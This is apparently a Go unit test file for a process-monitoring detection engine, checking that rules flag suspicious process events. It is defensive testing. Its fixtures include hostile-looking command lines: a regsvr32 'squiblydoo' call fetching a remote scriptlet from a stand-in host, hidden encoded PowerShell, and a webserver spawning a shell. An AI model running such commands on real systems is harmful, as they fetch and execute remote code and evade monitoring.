package detect

import (
	"testing"

	"github.com/HPK13/proctrace/internal/event"
	"github.com/HPK13/proctrace/internal/lineage"
)

func proc(name, path, cmd, parent string) event.Process {
	p := event.Process{PID: 1234, PPID: 1000, Name: name, Executable: path, CommandLine: cmd}
	if parent != "" {
		p.Parent = &event.Parent{PID: 1000, Name: parent}
		p.ParentStatus = lineage.StatusVerified
	} else {
		p.ParentStatus = lineage.StatusExited
	}
	return p
}

func TestDefaultRules(t *testing.T) {
	e, err := LoadFile("../../rules/default.json")
	if err != nil {
		t.Fatal(err)
	}
	const sys = `C:\Windows\System32\`
	tests := []struct {
		name string
		p    event.Process
		want []string // rule IDs expected, in any order
	}{
		{"word spawns powershell", proc("powershell.exe", sys+`WindowsPowerShell\v1.0\powershell.exe`, "powershell.exe -nop", "WINWORD.EXE"), []string{"PT-W001"}},
		{"normal svchost", proc("svchost.exe", sys+"svchost.exe", "", "services.exe"), nil},
		{"svchost wrong parent", proc("svchost.exe", sys+"svchost.exe", "", "explorer.exe"), []string{"PT-W002"}},
		{"svchost unknown parent does not fire", proc("svchost.exe", sys+"svchost.exe", "", ""), nil},
		{"svchost outside system32", proc("svchost.exe", `C:\Users\bob\AppData\Local\Temp\svchost.exe`, "", "services.exe"), []string{"PT-W004", "PT-W013"}},
		{"lookalike scvhost", proc("scvhost.exe", `C:\Users\Public\scvhost.exe`, "", "explorer.exe"), []string{"PT-W005", "PT-W013"}},
		{"lookalike with space", proc("lsass .exe", `C:\ProgramData\lsass .exe`, "", "explorer.exe"), []string{"PT-W005", "PT-W013"}},
		{"cyrillic homoglyph", proc("svchоst.exe", "", "", ""), []string{"PT-W005", "PT-W006"}},
		{"encoded powershell", proc("powershell.exe", "", "powershell -w hidden -enc SQBFAFgA", "cmd.exe"), []string{"PT-W007"}},
		{"plain powershell", proc("powershell.exe", "", "powershell.exe -File build.ps1", "explorer.exe"), nil},
		{"squiblydoo", proc("regsvr32.exe", "", `regsvr32 /s /n /u /i:http://evil.example/x.sct scrobj.dll`, "cmd.exe"), []string{"PT-W009"}},
		{"linux webshell", proc("sh", "/usr/bin/dash", "sh -c id", "nginx"), []string{"PT-L001"}},
		{"real explorer is not a lookalike", proc("explorer.exe", `C:\Windows\explorer.exe`, "", "userinit.exe"), nil},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			dets, score := e.Evaluate(tc.p)
			got := map[string]bool{}
			for _, d := range dets {
				got[d.RuleID] = true
			}
			if len(got) != len(tc.want) {
				t.Fatalf("got %v, want %v", dets, tc.want)
			}
			for _, id := range tc.want {
				if !got[id] {
					t.Fatalf("missing %s; got %v", id, dets)
				}
			}
			if len(tc.want) == 0 && score != 0 {
				t.Fatalf("score %d for clean process", score)
			}
		})
	}
}

func TestRiskScore(t *testing.T) {
	e, err := New([]Rule{
		{ID: "a", Score: 70, Match: Match{Name: []string{"x.exe"}}},
		{ID: "b", Score: 30, Match: Match{Name: []string{"x.exe"}}},
		{ID: "c", Score: 99, Match: Match{Name: []string{"x.exe"}}},
	})
	if err != nil {
		t.Fatal(err)
	}
	dets, score := e.Evaluate(event.Process{Name: "X.EXE"})
	if dets[0].RuleID != "c" || score != 100 {
		t.Fatalf("top=%s score=%d, want c / 100", dets[0].RuleID, score)
	}
}

func TestDuplicateIDRejected(t *testing.T) {
	_, err := New([]Rule{{ID: "a", Match: Match{Name: []string{"x"}}}, {ID: "a", Match: Match{Name: []string{"y"}}}})
	if err == nil {
		t.Fatal("expected duplicate id error")
	}
}
